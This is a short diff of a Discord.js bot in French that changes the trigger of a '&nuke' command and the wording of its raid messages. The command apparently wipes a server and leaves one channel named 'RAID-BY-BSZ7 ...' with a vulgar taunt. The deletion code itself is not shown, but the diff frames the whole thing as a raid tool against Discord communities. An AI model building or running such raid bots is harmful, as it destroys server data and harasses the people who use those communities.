@@ -1,7 +1,7 @@
 const { PermissionsBitField } = require('discord.js');
 
 client.on('messageCreate', async (message) => {
-  if (message.content === '!nuke') {
+  if (message.content === '&nuke') {
     // Sécurité : seuls les administrateurs peuvent utiliser cette commande
     if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
       return message.reply("❌ Tu dois être administrateur pour utiliser cette commande.");
@@ -18,11 +18,11 @@ client.on('messageCreate', async (message) => {
 
       // Recrée un seul salon textuel avec le nom demandé
       const newChannel = await guild.channels.create({
-        name: 'RAID-BY-BSZ7',
+        name: 'RAID-BY-BSZ7 JVOUS BZ SLP MON DISCORD CEST BSZ7',
         type: 0, // salon textuel
       });
 
-      await newChannel.send('💥 **RAID BY BSZ7 VOUS BZ**');
+      await newChannel.send('💥 **RAID BY BSZ7 VOUS BZ MON DISCORD CEST BSZ7**');
     } catch (err) {
       console.error(err);
     }
